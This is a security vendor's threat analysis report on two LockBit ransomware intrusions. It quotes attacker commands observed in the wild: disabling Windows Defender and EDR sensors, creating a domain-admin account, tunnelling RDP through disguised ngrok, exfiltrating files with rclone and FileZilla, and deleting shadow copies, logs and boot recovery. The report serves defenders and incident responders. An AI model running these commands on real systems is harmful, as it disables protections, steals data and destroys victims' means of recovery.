The Cybereason Global Security Operations Center (GSOC) Team issues Cybereason Threat Analysis Reports to inform on
impacting threats. The Threat Analysis Reports investigate these threats and provide practical recommendations for protecting
against them.

1/34

In this Threat Analysis report, Cybereason GSOC team analysts have analyzed two different cases that involved LockBit
infections, occurring at two very different time periods. Following this introduction, we describe in detail the attack chain from
the initial infection to the ransomware deployment.

Key Points
Intensive data exfiltration: Cybereason observed LockBit stealing large amounts of information from its victims. The
threat actors mostly used FTP and cloud file hosting solutions such as FileZilla, Rclone and MegaSync to exfiltrate the
information.
Constantly evolving tools and techniques: LockBit operates on a RaaS (Ransomware as a Service) model. The
affiliates that use LockBit’s services conduct their attacks according to their preference and use different tools and
techniques to achieve their goal. As the attack progresses further along the kill chain, the activities from different cases
tend to converge to similar activities.
EDR-aware mentality: The attackers are constantly evolving, and take into consideration that EDR tools are doing the
same. Thus, the attackers are making detection, investigation, and prevention more complex by disabling EDR and
other security products, while deleting the evidence to baffle forensics attempts.
Cybereason Managed Detection and Response (MDR): The Cybereason GSOC team has a zero-tolerance policy
towards attacks involving LockBit and its affiliates, and categorizes such attacks as critical, high-severity incidents. The
Cybereason GSOC MDR Team issues a comprehensive report to customers when such an incident occurs. The report
provides an in-depth overview of the incident, which helps to understand the scope of the compromise and the impact on
the customer’s environment. These reports also provide attribution information whenever possible, as well as
recommendations for threat mitigation and isolation.
Detected and prevented: The Cybereason Defense Platform effectively detects and prevents infections from LockBit
and their affiliates.

Introduction
In September 2019, a new version of a worm-like ransomware was reported. This ransomware was known as LockBit. Since
then, a new variant of LockBit was discovered, dubbed–LockBit 2.0.
LockBit 2.0 is very efficient and can spread quickly within a target network. It also operates in a RaaS (Ransomware-as-aservice) model, which has become an increasingly popular business model for ransomware operators in the past few years,
helping ransomware groups expand their reach and revenue while scaling up, without considerably growing their core team or
expenses.
RaaS is a subscription-based model that enables affiliates to use existing ransomware tools and infrastructure in order to
execute ransomware attacks. LockBit 2.0 incentivizes affiliates to earn a percentage of each successful ransom payment by
leveraging their tools to compromise entire networks and systems.
Similar to other ransomware, LockBit 2.0 uploads the compromised files to a public repository, where they are available to
everyone on the internet:

We have observed many different ransomware attacks which have increased massively over the past months. LockBit is one
of the dominating ones, and in fact, is a highly sophisticated form of ransomware (see also: White Paper - Inside Complex
RansomOps and the Ransomware Economy). Current potential LockBit 2.0 victims’ business sectors range from IT services,
to financial institutions, to other large organizations.
After the attackers have cleared their footstep by tampering with Windows security features to eliminate the possibility of
recovering the encrypted data by deleting backups and restoring features, the attackers proceed to encrypt the files on the
affected machines.
After the encryption, the user receives a ransom note informing them about the encryption of the files and provides
instructions on how to decrypt them by paying the ransom:

Post encryption ransom note as observed in one case study
The high demand for LockBit’s services and its effective affiliate program makes it a growing threat that should not be
overlooked.
Cybereason successfully detects LockBit’s operation and is able to facilitate the scoping of the threat, its magnitude and
spread, and thus helps impacted organizations to act on time and stop the attack from infecting more systems and crucial
assets.

Analysis
Attack Life Cycle: Case Study 1

3/34

Attack diagram as observed in this case study
This case study describes how LockBit affiliates penetrated a network in Q4 2021 and worked their way through it to encrypt
the assets of the victim, a company in the industrial sector.
Infection Vector
The affiliates working with LockBit are using their own malware and tools to launch the actual attacks on their targets. In most
of the infections that we have encountered, the infection vector that led to the delivery of LockBit was a misconfigured service,
particularly a publicly opened RDP port.
In other cases, affiliates would use a more traditional phishing email that will allow them to remotely connect to a network via
an employee’s computer, or utilize malicious attachments, downloads, application patch exploits or vulnerabilities to gain
access to a network.
Credentials Access and Reconnaissance
Once the attacker established an initial foothold on the compromised network (machine), their next step was to start the
reconnaissance activity and credentials extraction.
In this case, the attackers used tools such as Mimikatz and Netscan, a powerful network monitoring system that is used to
identify the network’s structure and valuable assets on the network. Both of these tools were used to assist lateral movement
throughout the network:

As can be seen in the image below, the attacker also used taskmgr.exe (Windows Task Manager) to create a memory dump of
lsass.exe (Microsoft Local Security Authority Subsystem Service) to extract the user’s credentials:

Dumping lsass.exe process memory as seen in the Cybereason Defense Platform
Vulnerabilities Exploitation
To achieve more stealth and gain elevated privileges, the attackers also attempted to exploit the SpoolFool vulnerability (CVE2022-21999), which was first reported in February 2022. This vulnerability allows an unprivileged user to create arbitrary and
writable directories by configuring the SpoolDirectory attribute on a printer.
Since an unprivileged user is allowed to add remote printers, an attacker can create a remote printer and grant everyone the
right to manage this printer. Eventually, this is further used to perform tasks such as injecting malicious modules:

5/34

Exploitation of the SpoolFool vulnerability as seen in the Cybereason Defense Platform
Lateral Movement and Remote Code Execution
The attacker used PsExec to execute commands and other malicious executables and files on different machines on the
network.
PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s similar to a
remote access program but instead of controlling the computer with a mouse, commands are sent via the Command Prompt.
PsExec may be used by the attacker not only to manage processes on the remote computer, but also to redirect an
application’s console output to his computer, making it appear as though the process is running locally.
Defense Evasion
Impairing Defenses

As can be seen in the image below, the attacker used PsExec to remotely execute files and tools on the affected machines,
such as :
C:\WINDOWS\system32\cmd.exe /c "1.cmd"
C:\WINDOWS\system32\cmd.exe /c "rdp.bat"
These commands were used to enable RDP connections and tamper with the Windows Defender settings. These actions
were taken in order to allow the attacker to remotely connect to the machines via compromised credentials and view, transfer
or manipulate every file on the user’s system.
To enable RDP connections, the attackers used the aforementioned scripts which changed the registry value of the following
to zero which specifies that Remote Desktop connections are enabled:
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
The attackers have also used a Netsh command for adding a rule to the Windows Firewall exceptions list, allowing the use of
RDP on local port (3389):
netsh advfirewall firewall add rule name=”allow RemoteDesktop” dir=in protocol=TCP localport=3389 action=allow
In addition, as part of the executed scripts activity, PowerShell was observed executing the command “-Command AddMpPreference -ExclusionPath *C:\\” which altered the Windows Defender settings by adding every file located under the (C:)
directory to the Windows Defender exclusion list, meaning every file that is located under this directory will not be monitored
by Windows Defender.
That gave the attackers a “free hand” to operate and execute every file they desired with no interference or prevention:

6/34

For the attack to execute effectively, attackers conduct preliminary actions. Once executed, LockBit deletes important records,
backups, and data from the infected host in order to prevent forensics and recovery attempts of the encrypted data:

rdp.bat enabling RDP connections and tampering with Windows security as seen in the Cybereason Defense Platform
Subverting Recovery Methods

The attacker used wevtutil, a Windows legacy tool which enables retrieving information about event logs. The commands in
the image below were used by the attackers to clear logs that contain records of login/logout activities or other security-related
events specified by the system’s audit policy and applications.
The attackers executed this program in order to hide their tracks to avoid future forensics on the host:

Using wevtutil to clear security logs as seen in the Cybereason Defense Platform

7/34

Another method we have spotted of deleting footprints by the attacker was using the ping command as a delay mechanism,
allowing the ransomware process to terminate. Then the File System utility (Fsutil.exe) is used to prevent the malicious
executable from being recovered by overwriting the first 524KB with zeros:
fsutil file setZeroData offset=0 length=524288 [Lockbit binary file path]

Using fsutil.exe and ping to delete footprints as seen in the Cybereason Defense Platform
Besides the use of wevtutil, the attackers also destroyed recovery methods with the help of the tools bcdedit.exe, wmic.exe,
and vssadmin.exe.
BCDEdit is a command-line tool for managing the Boot Configuration Data. In this case, BCDEdit was used to ensure that
system boot failures are ignored and the recovery boot option disabled. This is also a method to make it harder for the user to
retrieve their data:

Using wevtutil.exe and bcdedit.exe to prevent recovery as seen in the Cybereason Defense Platform
The Volume Shadow Copy Service is an administrative tool that provides the framework for doing volume backups and for
creating consistent, point-in-time copies of data (known as shadow copies).
The attacker used both vssadmin.exe and Windows Management Instrumentation utility (wmic.exe) to delete the system’s
shadow copies, and in doing so, making it impossible for the user to restore to the latest restore point or use any of the
backups:

8/34

Deactivation of AV/EDR

As part of the attack, the attackers used legitimate tools such as a small portable freeware called “Defender Control” which is
used to disable Windows Defender in Windows 10 on some of the affected systems.
This is an easy yet effective method to disable Windows native security features:

Attack Life Cycle: Case Study 2

9/34

Attack diagram as observed in this case study
This case study describes how LockBit affiliates penetrated a network in Q2 2022 and worked their way through to encrypt the
assets of the victim, a company in the retail industry.
Lateral Movement
The first activity captured in this case study involves the PsExec utility by SysInternals. The threat actor laterally moved from
“patient zero” to another server through the PsExec tool:

Psexesvc.exe spawning children process controlled by the attacker as seen in the Cybereason Defense Platform
This allowed the threat actors to progress their intrusion by infecting more machines. Through the attack chain, the threat
actors continuously leveraged PsExec.exe and mstsc.exe to pivot from one server to others using the following command:
Psexec \\[IP of the server] -s cmd.exe

10/34

Mstsc.exe and PsExec.exe launched directly

from a machine with visibility as seen in the Cybereason Defense Platform
Persistence
Account Creation

The threat actors used net.exe to create a domain account and elevate its privileges to “domain administrator” through the
following commands :
C:\Windows\system32\net1 user /domain [Created attacker username] /add
C:\Windows\system32\net1 user
C:\Windows\system32\net1 user /domain [Created attacker username] Numlock!123 /add
C:\Windows\system32\net1 group "domain admins" [Created attacker username] /add
This implied that the attacker already had high privileges on the Active Directory domain of the victim:

11/34

Net.exe and net1.exe

being leveraged to create a domain user and assign it to the “administrators” domain group
The threat actor then used this account to persist and spread on the victim’s network.
Persistent Network Tunnel

The threat actor launched the following commands on 11 machines (10 servers, 1 workstation):
lssas.exe tcp 3389 --log=stdout
lssas.exe config add-authtoken 28hJ[...]KW27Jpi
The binary named “lssas.exe” is masquerading as “lsass.exe” (Windows process in charge of handling authentication on the
system) but is in fact the infamous tunneling tool, “Ngrok”:

Lssas.exe (in fact,

Ngrok) deployed on one of the affected machine through PsExec as seen in the Cybereason Defense Platform
Ngrok is a legitimate reverse proxy tool that is able to create a tunnel to servers located behind firewalls. It is also able to
tunnel traffic to local machines that do not have a public IP. Ngrok has been utilized by threat actors in many campaigns and is
known to be famous specifically for lateral movement and data exfiltration functionalities.
Executing Ngrok gave the attackers the ability to access the network remotely, even if the initial infection vector is later
patched or removed. The Cybereason GSOC team then observed RDP sessions initiated through this tunnel:

12/34

Remote interactive sessions executed through the Ngrok tool tunneling RDP traffic as seen in the Cybereason Defense
Platform
Credential Theft
The threat actor then proceeded to steal further credentials on the network, in order to extend their access on the network. In
this case study, the threat actors interactively used the Windows executable taskmgr.exe to dump the memory of the process
lsass.exe:

13/34

taskmgr.exe executable as seen in the Cybereason Defense Platform

14/34

The attackers then copied the memory dump file back onto the machine they controlled, using remote desktop (RDP) access
and the tunnel created earlier. They then used tools such as “Mimikatz” to extract credentials from the dump file.
A day later, as the attack progressed, the threat actors continued their credential collection activity by launching the Windows
executable ntdsutil.exe on one of the domain controllers:

Ntdsutil.exe command-line tool

executed on one of the domain controllers as seen in the Cybereason Defense Platform
This granted the attackers access to all Active Directory accounts name and password hashes, enabling them to eventually
attempt to recover the plaintext password.
Data Exfiltration
Once the LockBit affiliate achieved persistent remote access and sufficient credentials, they proceeded to collect and exfiltrate
the data.
The actors used three different tools for that purpose :
Filezilla.exe to connect to a remote FTP service controlled by the attacker
Rclone.exe to exfiltrate data to a “Mega”-related cloud hosting service
Megasync.exe tool to exfiltrate data to a “Mega”-related cloud hosting service
First, the threat actor installed and launched the filezilla.exe client using the following command lines :
C:\Users\[Username]\Downloads\FileZilla_3.59.0_win64_sponsored-setup.exe
Filezilla.exe

15/34

IP address in particular, 185.81.68.180, on random ports 50749, 54001, 59516 and 59705 as seen in the Cybereason
Defense Platform
The Cybereason GSOC team observed the exfiltration activity related to “Filezilla” on six servers. After this exfiltration method
was used, the threat actor leveraged Rclone.exe to again, exfiltrate data using the following commands:
rclone config
rclone copy "[HR data folder path]" [remote path]:[remote path]
This activity is captured below. One can observe that the executable is launched through PsExec and represents unusually
high network traffic:

16/34

Rclone.exe leveraged to exfiltrate data to mega.co.nz as seen in the Cybereason Defense Platform
Finally, the threat actor used a third tool to exfiltrate data to Mega[.]co[.]nz cloud hosting servers. The tool used for this is
called Megasync.exe. The attackers ran the following commands to exfiltrate the data:
C:\Users\[Username]\Downloads\MEGAsyncSetup64.exe
C:\Users\[Username]\AppData\Local\MEGAsync\MEGAsync.exe
C:\Users\[Username]\AppData\Local\MEGAsync\MEGAsync.exe /uninstall
The Cybereason GSOC team only observed the exfiltration activity related to Mega on the company main file server.
Network Discovery
At this point, the threat actor presented on the network for a while and had access to multiple servers and workstations. In
order to progress to its next and final phase, data encryption, the attacker needed a list of all the assets of the victim. The
actor leveraged the “Advanced IP Scanner” tool in order to identify as many machines as possible.
This tool is meant to actively discover hosts and their hosted services. The attacker launched it from two different servers that
are considered as “pivoting” machines for the actor:

17/34

Advanced IP scanner creating network connections and spawning remote desktop process (mstsc.exe) as seen in the
Cybereason Defense Platform
The actor also used the provided remote desktop client feature to spawn child mstsc.exe processes that are meant to connect
through the remote desktop service or RDP. We have observed a very high number of connections to internal IP addresses.
Approximately at the same time, the actor also infected 15 additional machines with the malware “Neshta”. Neshta is a file
infector which injects its malicious code to targeted executable files:

18/34

Neshta was injected

into many executables, also spawning the “svchost.com” process as a result, which spawns the legitimate executable again
as a child process as seen in the Cybereason Defense Platform
As previously mentioned in the community, some LockBit and other ransomware and attacks (REvil/Sodinokibi, for instance)
are found to be concurrent with present Neshta infections on the same environment.
We did not find evidence that demonstrates the specific use of Neshta by the attackers, and hence we strongly believe that
the tools the attackers used were pre-infected with Neshta:

19/34

Source : https://twitter.com/AltShiftPrtScn/status/1519265746630717440
At this point, the LockBit affiliate had completed all the necessary steps to execute the LockBit payload and commence
encryption:
Persistence on the network through multiple infected machines
Access to top-privilege accounts
Collected and exfiltrated victim data
List of most assets through network discovery and scans

Defense Evasion and Impact Phases
This section describes the “Defense Evasion” and “Impact” phases (according to the MITRE ATT&CK Tactic classification).
Approximately four hours before the global deployment of the LockBit ransomware, the attacker bypassed existing security
features and also deleted evidence in order to complicate investigation and forensics attempts.
Security Products Deactivation Attempts
First, the threat actor attempted to disable the Cybereason sensors, directly from the impacted machine. For that purpose,
they used the two following commands :
CrDrvCtrl disable test, which attempts to disable the driver installed by the EDR
Wmic product where name=”Cybereason Sensor” call uninstall /noninteractive, which attempts to uninstall the sensor on
the machine

Both attempts failed in the context of the victim. The threat actor then attempted to disable EPP/AV products on the different
machines. Bitdefender was first targeted through the attempt to disable BitDefender mini-filter with the command:
“fltmc” unload gzflt

A few minutes before it launched the ransomware, the attacker also launched “defendercontrol.exe” on 14 servers. As stated
in the previous case study, Defender Control is used to disable Microsoft Defender:

21/34

Launching of “defendercontrol.exe” as seen in the Cybereason Defense Platform
In addition to the use of “defendercontrol.exe”, the attacker launched the following commands, that were started from a
service created by the attacker, named “TrustedInstaller”:
“PowerShell -nop -win 1 -c & {$AveYo=' A LIMITED ACCOUNT PROTECTS YOU FROM UAC EXPLOITS
';$env:1=6;$k=@();$k+=gp Registry::HKEY_Users\S-1-5-21*\Volatile* ToggleDefender -ea 0;iex($k[0].ToggleDefender)}”

Net1.exe stop windefend - D
sc.exe config windefend depend=RpcSs-TOGGLE

22/34

Defense Platform
In order to execute all the activities related to “Defense Evasion”, the actor used a batch script to automate the execution:

23/34

Batch scripts launched remotely on the targeted

machines
Ransomware Deployment
The threat actor launched the Lockbit ransomware executable. The threat actor used three different methods for this purpose
:
Manual deployment through RDP
Semi-automated deployment with “PsExec” through the ransomware binary itself
Creation of a dedicated GPO (Group Policy Object) on the main Active Directory forest
The GPO created scheduled tasks that :
Attempted to kill security-related and backup-related products’ processes
Stopped many application-related services (for instance, SQL engine services)
Launched the Lockbit ransomware executable

24/34

Extract from the GPO

created by the attacker
The ransomware executed on the victim machines was “Lockbit 2.0”. It was configured to automatically spread on all
configured targets and thus created internal network connections:

25/34

It also spawned multiple child processes including:
"C:\Windows\SysWOW64\mshta.exe"
"C:\Users\TEMP\Desktop\LockBit_Ransomware.hta" [GUID]

Preparing the Machines for Encryption
The Lockbit ransomware launched cmd.exe which created different child processes in order to prepare the machine for
encryption. The following commands were issued by the executable:
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No
wmic SHADOWCOPY /nointeractive
ping 127.0.0.7 -n 3
fsutil file setZeroData offset=0 length=524288 "C:\Windows\LockBit_[Random number].exe"

26/34

LockBit ransomware execution preparing the machine

for encryption with backup deletion and machine performance modification as seen in the Cybereason Defense Platform
This activity is exactly the same as the one documented in the first case study. You can refer to the first case study for more
information.
Log Deletion
The system events deletion phase happened approximately at the same time as the launch of the ransomware.

27/34

Similar to the activity documented in the first case study, this shows an enhancement compared to the first case study log
deletion attempts, as many event sources are targeted, instead of just deleting “security”, “system” and “application” Windows
events:

Listing of wevtutil.exe commands launched by the attacker

The command “Wevtutil CL [Event source]” is used to clear local Windows event logs.

A Glance Into the IOCs
The infrastructure in use by the attacker that was identified in the second case study is heterogenous, depending on the tool
used:
For persistence and exfiltration activities, the attacker leveraged cloud servers. For instance, subdomains from
“userstorage.mega.co.nz” or “ngrok.io” (rclone.exe tool, megasync.exe tool, ngrok tool)
For another exfiltration tool, Filezilla, which is an FTP client, the context is different: an IP address stood out,
185.81.68[.]180, located in Russia
The Cybereason GSOC team analyzed the infrastructure related to this IP address and identified the following key points:
The IP address is not detected in VirusTotal
The service provider is located in Russia
The ISP company, based in Cyprus, is named Starcrecium, associated in the past with other malicious actors
Many network services observed on the IP address, including remote desktop, HTTP, FTP, WinRM
